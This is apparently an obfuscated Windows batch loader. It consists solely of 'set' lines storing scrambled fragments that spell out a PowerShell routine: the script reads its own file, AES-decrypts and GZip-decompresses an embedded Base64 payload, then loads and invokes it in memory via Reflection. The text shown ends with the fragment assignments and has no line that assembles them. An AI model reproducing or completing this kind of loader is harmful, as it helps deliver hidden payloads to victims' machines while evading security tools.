@echo off
set "wZLxtlSsIu=Secu"
set "fIuyfesEme=join"
set "EkQNkZHRoW=wU, "
set "pbLQuYtsyf=comp"
set "GVmGTSqlYG=.Len"
set "uhwnKPIjXA=Comp"
set "lbZlTqchEp=daeR"
set "muShPxLBtv=:('g"
set "lYYJDIOlIM=.Dis"
set "RyErSJmNfP=tion"
set "VMCgOmdTfq=;$Yd"
set "cMfVOUCPpU=brea"
set "huwJskaDhf=]::("
set "nHWIkHEDUU=;$eJ"
set "OmGGdZNJCS=ct S"
set "EIyHrLRrkl=[]] "
set "iTfsOXOPxn=ptog"
set "ZZYxPxDydP=$RiW"
set "euRzUVRYlc=ispo"
set "IGOZyjBXHN=yste"
set "AjXHUmUnQJ=y.Ci"
set "XVewzZHQwb=('Tg"
set "fwVhgAWgpT=7;$W"
set "RRbYSAoHki=ddin"
set "GUvtUVSfzF=);$W"
set "quRRNZUCuf=se()"
set "XMVdiqrTpO=ach "
set "VTAhUqLPxS=ateD"
set "PIsVcNbLxf=orF'"
set "FziYQULVAH=('%~f0'"
set "FMGATDlJUj=stem"
set "ChbkLwDELi=rofi"
set "fjLNVBevbI=PxEW"
set "SUEoCewCaN=6esa"
set "FjcScqRQET=Obje"
set "WgVVptxdKD=();$"
set "SSfBNwQtmu=('%*'"
set "qTBIughCcu=in $"
set "ZmbAWgkYrd=embl"
set "hIavMZPuGd=Osy "
set "kLlxkQgTIW=ress"
set "CdpXpiPCFg=iWET"
set "EygpNbTGtc=comm"
set "QPiDAHSNEl=  $P"
set "tOxNbISXWD=-nop"
set "lJYacEGCZu=.Key"
set "kBekgctieO=rt]:"
set "HRzHzykbLC=t Sy"
set "MAQJrLubqK=.Cry"
set "jRMQgEizDT=nwU."
set "OiPVpNvJuw=j = "
set "QbSvSfnZLi=lBlo"
set "QBouQINdFR=-ep "
set "AmqtjFxeuM=oL'["
set "UtgVaAkLqQ=onve"
set "nkGhIesNiZ=.GZi"
set "tweEdxBWGW=iron"
set "yAOOkkmHDE=RiWE"
set "ByDYyAxXSk== $W"
set "LtKYleWuRY=sy.T"
set "xDMFpSXyVr=$Bos"
set "ZupzFwedWH=Tn.T"
set "KpDPAGvzZg=($Fh"
set "lVWUdUUQvU=dF.I"
set "mnnpcLKkqV=eam("
set "uwrxUhmXgj=.Com"
set "CoNbpPRmLf=esaB"
set "mAOvTzdNnG=ose("
set "CxSzRudgpo=raph"
set "NxpkkDoboD=raph"
set "qNCntYRQef=[Sys"
set "UuzgTvTLld=stem"
set "RvZAyYLkTw=osTn"
set "YTakCgwohc=$Bos"
set "EssiyzKEzJ=WBrd"
set "CFVJsSlVgg=Invo"
set "HCzswrfEBC=tem."
set "aNufedKprT=tS46"
set "ClBvjWicfI=y.Pa"
set "ODqksXbLRs=ewLi"
set "nUxLKFYiNu=::De"
set "QsLiwkCiZW=oint"
set "sxgHHzxHjp=s75K"
set "DsTJpDTJGw=.IO."
set "gBhxikmviO=6] -"
set "qnqLeazgxI=]::("
set "GfJqYPyhNh=ect "
set "hspfuhinfF=-4] "
set "osYOyvQBUi=[Sys"
set "LIDXLbYVJg=pher"
set "rXBkrPPdnR=t.Su"
set "EJWkWJFolC=$WrO"
set "ndOMioODgX=-joi"
set "gSIkGUKgfp='0Pg"
set "GEmayfFHfi=Disp"
set "QekPkSFzvg= '')"
set "oFzeTDDEHL=$yCk"
set "CntZWJzmdH=zuZI"
set "QNyrtlLIEA=mory"
set "ryOdaTjldK=Obje"
set "UDkdZPTmFW=yCkx"
set "emhsgmnDwy=null"
set "IyjVzAkWTd=ct S"
set "btCninZXvM=).Sp"
set "pxtRybxAfc=ress"
set "xTxetzfTMz= '')"
set "ZEbUZvztSv=$Bos"
set "cuQowlMMgk=m.IO"
set "jFadkuyQKl=Fina"
set "xQgQhPrlgg=dj0C"
set "nhSNnGzvHl=[Env"
set "AHNchKTUPb=-Obj"
set "vJCnckZhiZ=pose"
set "jQilwaXZGe= [Sy"
set "FvTGKNyDbG=New-"
set "UFMOVKngkw===')"
set "MfGqmgquXM=mo ="
set "AOttMIZzso=);$R"
set "sKfnwzvrrc=bjec"
set "JwWLZSxUoA=V = "
set "YIuyVBhlvM=pose"
set "nYlFTGsHVP=BrdF"
set "wanwuDxANJ=$bKw"
set "wtKpdOQhIG=)) {"
set "TZGpgqyDDf=ring"
set "pcQSUpEPop='gni"
set "TcGkLFdkbN=ne);"
set "PjyxoBMPax=y]::"
set "CaLLsNaiPY=join"
set "dHLxSsupUM=F.Pa"
set "agSztnJFHQ=;$Wr"
set "dSVuVfFhQX=ion."
set "ZjuTbZXqfX=[IO."
set "RRKuyLitzA=O.Me"
set "xWmAOYysMe=yCkx"
set "QFEOdVgMAT=Stre"
set "wDmXrbyvIv=rtS4"
set "EzvXzNqZGB=rans"
set "kBsafKbbkc=ode]"
set "mmdQckPFTM=)($P"
set "jqcCEOcwXj=.Sec"
set "oEVLdHQjEY=iLVf"
set "mSdNvrtNJQ=('da"
set "ujpPVnrmKS=Syst"
set "RsjEKIDSaj=flec"
set "yjcqxTGoUS=1] -"
set "AADtlVHTOH=eMVs"
set "VfEocNfyLn=YxVw"
set "uZjxYoNYod=BrdF"
set "qPiEubaYJX=BrdF"
set "rpArxNBJII=rity"
set "yuCbLscyHg=yste"
set "pSHqIiXkYc=)($y"
set "MgGUXXOSDX=gnir"
set "lzIRRiRDxi=th('"
set "mbCsqpYWqE=m(, "
set "wjPGKmecdI=CFxo"
set "dcOfpJoQTv=; };"
set "iDHCmbvIff=Osy."
set "VyPWtUAOaC=]::N"
set "MxoADCTfoI=-joi"
set "whDCDqIRCm=ert]"
set "LpKHlxsFFi=..-1"
set "sQbqqDxQNX=PTtG"
set "dNmYBIHxgo='[-1"
set "ZwqkDeSoIa=.Dis"
set "aqgTgzFiDO=m.Re"
set "VIlBWBxDqi=l5E7"
set "CEjslgQAfA=3); "
set "CTguBuRcNJ=Conv"
set "VXjJbCfAvZ=n ''"
set "dGVUHerSae=S46e"
set "knjJgEuEpO== [S"
set "ryUNHBQDva=ress"
set "dsLwqSPtNc= = $"
set "ITVnVoxHUA=e = "
set "QNNNBUbRcv=$WBr"
set "YDOqWurIpG=hy.A"
set "gDuLvLvTHr=PKCS"
set "sGHJDXJwZa=ck($"
set "JJMhgZSmWo=sion"
set "IRzJojKgvz=:: '"
set "JBPhdLEKCx=U = "
set "TzQlGLJPEQ=oryS"
